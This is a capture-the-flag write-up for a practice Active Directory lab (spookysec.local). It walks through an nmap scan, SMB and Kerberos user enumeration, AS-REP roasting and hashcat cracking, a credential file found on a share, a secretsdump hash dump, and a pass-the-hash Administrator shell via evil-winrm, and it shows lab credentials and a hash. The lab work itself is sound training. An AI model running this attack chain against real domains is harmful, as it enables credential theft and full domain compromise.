# Attacking Active Directory

## Scanning and Enumeration

Doing an nmap scan:

```bash
nmap -p- -A -T4 10.10.213.34
```

Output:  

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-11-13 19:31:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2020-11-13T19:32:44+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2020-09-16T22:48:24
|_Not valid after:  2021-03-18T22:48:24
|_ssl-date: 2020-11-13T19:32:52+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC

Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%)
```

#### Port 139/445 SMB

Trying to enumerate SMB with smbclient and smbmap failed so

```bash
smbclient -L \\10.10.213.34
smbclient -N -L \\10.10.213.34
smbmap -H 10.10.213.34 -R
```

Let's try **enum4linux**

```bash
enum4linux -a 10.10.213.34
```

I read some stuff for [TLD](https://wiki.samba.org/index.php/Active_Directory_Naming_FAQ)
and i was able to answer the Task 2 Questions

Some Information we got from **enum4linux**:

```text
Domain Name: THM-AD
Full AD domain: spookysec.local
TLD: .local (invalid)
```

#### Port 88 Kerberos

Let's try to find some valid users with the given wordlists
(It is **NOT** recommended to brute force creds due to account lockout policies
that we cannot enumerate on the domain controller)

```bash
/opt/windows/kerbrute/dist/kerbrute_linux_amd64 userenum --dc spookysec.local -d spookysec.local /root/thm/medium/ctfs/attactivedirect/users.txt -t 100
```

## Exploitation

Introduction

After the enumeration of user accounts is finished,
we can attempt to abuse a feature within Kerberos with an attack method called
ASREPRoasting. ASReproasting occurs when a user account has the privilege
"Does not require Pre-Authentication" set.
This means that the account does not need to provide valid identification
before requesting a Kerberos Ticket on the specified user account.

Exploitation

Impacket has a tool called "GetNPUsers.py"
(located in Impacket/Examples/GetNPUsers.py) that will allow us to query
ASReproastable accounts from the Key Distribution Center.
The only thing that's necessary to query accounts is a valid set of usernames
which we enumerated previously via Kerbrute.

```bash
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -no-pass -usersfile users.txt
```

And we get **svc-admin's** hash

To crack it we can use **hashcat**
The syntax is:

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
```

## Post Exploitation

With a user's account credentials we now have significantly more access within
the domain. We can now attempt to enumerate any shares that the domain
controller may be giving out.

Using **smbclient** and the using the creds that I found

```bash
smbclient -U svc-admin -L \\\\10.10.30.33\\
smbclient -U svc-admin \\\\10.10.30.33\\backup
```

We retrieve a backup file named **backup_credentials.txt**

If we decode the content we find out the hidden creds

```text
backup@spookysec.local:backup2517860
```

We now can use **impacket-secretsdump** with backup's credentials to dump
some hashes

```bash
impacket-secretsdump -just-dc backup:backup2517860@spookysec.local
```

## Privilege Escalation

In the hash dump we find the hash of the Administrator user and we get
a shell as Administrator with **evil-winrm**

```bash
evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

```json
```
